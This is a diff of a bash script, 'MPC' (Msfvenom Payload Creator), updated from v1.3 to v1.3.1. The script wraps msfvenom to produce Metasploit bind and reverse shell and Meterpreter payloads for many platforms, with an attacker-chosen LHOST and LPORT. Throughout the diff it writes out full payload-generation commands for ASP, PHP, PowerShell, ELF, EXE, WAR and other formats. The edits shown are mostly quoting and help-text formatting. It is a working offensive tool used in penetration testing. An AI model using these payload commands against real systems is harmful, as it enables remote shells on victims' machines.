@@ -1,6 +1,6 @@
 #!/bin/bash
 #-Metadata----------------------------------------------------#
-#  Filename: mpc.sh (v1.3)               (Update: 2015-07-20) #
+#  Filename: mpc.sh (v1.3.1)             (Update: 2015-07-24) #
 #-Info--------------------------------------------------------#
 #  Quickly generate Metasploit payloads using msfvenom.       #
 #-Author(s)---------------------------------------------------#
@@ -122,7 +122,10 @@ function doAction {
       \rm -f /tmp/mpc.out
     else
       echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(." >&2
-      echo -e "\n----------------------------------------------------------------------------------------${RED}"
+      echo -e "\n----------------------------------------------------------------------------------------"
+      [ -e "/usr/share/metasploit-framework/build_rev.txt" ] && \cat /usr/share/metasploit-framework/build_rev.txt || \msfconsole -v
+      \uname -a
+      echo -e "----------------------------------------------------------------------------------------${RED}"
       \cat /tmp/mpc.out
       echo -e "${RESET}----------------------------------------------------------------------------------------\n"
     fi
@@ -153,13 +156,13 @@ EOF
 
 ## doAction
 function doHelp {
-  echo -e "\n ${YELLOW}[i]${RESET} ${BLUE}${0}${RESET} <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)"
-  echo -e " ${YELLOW}[i]${RESET}   Example: ${0} windows 192.168.1.10        # Windows & manual IP."
-  echo -e " ${YELLOW}[i]${RESET}            ${0} elf eth0 4444               # Linux, eth0's IP & manual port."
-  echo -e " ${YELLOW}[i]${RESET}            ${0} stageless cmd py verbose    # Python, stageless command prompt."
-  echo -e " ${YELLOW}[i]${RESET}            ${0} loop eth1                   # A payload for every type, using eth1's IP."
-  echo -e " ${YELLOW}[i]${RESET}            ${0} msf batch wan               # All possible Meterpreter payloads, using WAN IP."
-  echo -e " ${YELLOW}[i]${RESET}            ${0} help verbose                # This help screen, with even more information."
+  echo -e "\n ${YELLOW}[i]${RESET} ${BLUE}${0}${RESET} <${BOLD}TYPE${RESET}> (<${BOLD}DOMAIN/IP${RESET}>) (<${BOLD}PORT${RESET}>) (<${BOLD}CMD/MSF${RESET}>) (<${BOLD}BIND/REVERSE${RESET}>) (<${BOLD}STAGED/STAGELESS${RESET}>) (<${BOLD}TCP/HTTP/HTTPS/FIND_PORT${RESET}>) (<${BOLD}BATCH/LOOP${RESET}>) (<${BOLD}VERBOSE${RESET}>)"
+  echo -e " ${YELLOW}[i]${RESET}   Example: ${BLUE}${0} windows 192.168.1.10${RESET}        # Windows & manual IP."
+  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} elf bind eth0 4444${RESET}          # Linux, eth0's IP & manual port."
+  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} stageless cmd py https${RESET}      # Python, stageless command prompt."
+  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} verbose loop eth1${RESET}           # A payload for every type, using eth1's IP."
+  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} msf batch wan${RESET}               # All possible Meterpreter payloads, using WAN IP."
+  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} help verbose${RESET}                # Help screen, with even more information."
   echo ""
   echo -e " ${YELLOW}[i]${RESET} <${BOLD}TYPE${RESET}>:"
   echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}ASP${RESET}"
@@ -210,7 +213,7 @@ function doHelp {
   [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} By altering the traffic, such as <${BOLD}HTTP${RESET}> and even more ${BOLD}<HTTPS${RESET}>, it ${YELLOW}will slow down the communication & increase the payload size${RESET}."
   [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} ${YELLOW}More information${RESET}: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication"
   echo ""
-  echo -e " ${YELLOW}[i]${RESET} <${BOLD}BATCH${RESET}> will generate ${YELLOW}as many combinations as possible${RESET}: <${BOLD}TYPE${RESET}>, <${BOLD}CMD + MSF${RESET}>, <${BOLD}BIND + REVERSE${RESET}>, <${BOLD}STAGED + STAGLESS${RESET}> & <${BOLD}TCP + HTTP + HTTPS + FIND_PORT${RESET}> "
+  echo -e " ${YELLOW}[i]${RESET} <${BOLD}BATCH${RESET}> will generate ${YELLOW}as many combinations as possible${RESET}: <${BOLD}TYPE${RESET}>, <${BOLD}CMD${RESET} + ${BOLD}MSF${RESET}>, <${BOLD}BIND${RESET} + ${BOLD}REVERSE${RESET}>, <${BOLD}STAGED${RESET} + ${BOLD}STAGLESS${RESET}> & <${BOLD}TCP${RESET} + ${BOLD}HTTP${RESET} + ${BOLD}HTTPS${RESET} + ${BOLD}FIND_PORT${RESET}> "
   echo -e " ${YELLOW}[i]${RESET} <${BOLD}LOOP${RESET}> will just create ${YELLOW}one of each${RESET} <${BOLD}TYPE${RESET}>."
   echo ""
   echo -e " ${YELLOW}[i]${RESET} <${BOLD}VERBOSE${RESET}> will display ${YELLOW}more information${RESET}."
@@ -222,7 +225,7 @@ function doHelp {
 
 
 ## Banner
-echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET} v${BLUE}1.3${RESET})"
+echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET} v${BLUE}1.3.1${RESET})"
 
 
 ## Check system
@@ -544,7 +547,7 @@ if [[ "${TYPE}" == "asp" ]]; then
   TYPE="windows"
   FILEEXT="asp"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## ASPX
@@ -556,7 +559,7 @@ elif [[ "${TYPE}" == "aspx" ]]; then
   TYPE="windows"
   FILEEXT="aspx"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Bash
@@ -575,7 +578,7 @@ elif [[ "${TYPE}" == "bash" || "${TYPE}" == "sh" ]]; then
   TYPE="bash"
   FILEEXT="sh"
   PAYLOAD="cmd/unix${_STAGE}${DIRECTION}_bash"
-  CMD="msfvenom -p ${PAYLOAD} -f raw --platform unix -e generic/none -a cmd LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f raw --platform unix -e generic/none -a cmd LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Java
@@ -589,7 +592,7 @@ elif [[ "${TYPE}" == "java" || "${TYPE}" == "jsp" ]]; then
   TYPE="java"
   FILEEXT="jsp"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Linux
@@ -603,7 +606,7 @@ elif [[ "${TYPE}" == "linux" || "${TYPE}" == "lin" || "${TYPE}" == "elf" ]]; the
   TYPE="linux"
   FILEEXT="elf"    #bin
   PAYLOAD="${TYPE}/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## OSX
@@ -619,7 +622,7 @@ elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
   TYPE="osx"
   FILEEXT="macho"
   PAYLOAD="osx/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Perl
@@ -635,7 +638,7 @@ elif [[ "${TYPE}" == "perl" || "${TYPE}" == "pl" ]]; then
   TYPE="linux"
   FILEEXT="pl"
   PAYLOAD="cmd/unix${_STAGE}${DIRECTION}_perl"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform unix -a cmd -e generic/none LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform unix -a cmd -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## PHP
@@ -649,7 +652,7 @@ elif [[ "${TYPE}" == "php" ]]; then
   TYPE="php"
   FILEEXT="php"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Powershell
@@ -660,7 +663,7 @@ elif [[ "${TYPE}" == "powershell" || "${TYPE}" == "ps1" ]]; then
   TYPE="windows"
   FILEEXT="ps1"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ps1 --platform ${TYPE} -e generic/none -a x86 LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f ps1 --platform ${TYPE} -e generic/none -a x86 LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Python
@@ -678,7 +681,7 @@ elif [[ "${TYPE}" == "python" || "${TYPE}" == "py" ]]; then
   TYPE="python"
   FILEEXT="py"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Tomcat
@@ -696,7 +699,7 @@ elif [[ "${TYPE}" == "tomcat" || "${TYPE}" == "war" ]]; then
   TYPE="tomcat"
   FILEEXT="war"
   PAYLOAD="java/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f raw --platform java -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f raw --platform java -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Windows
@@ -708,7 +711,7 @@ elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" ]]; t
   TYPE="windows"
   FILEEXT="exe"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > ${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 # Batch/Loop modes
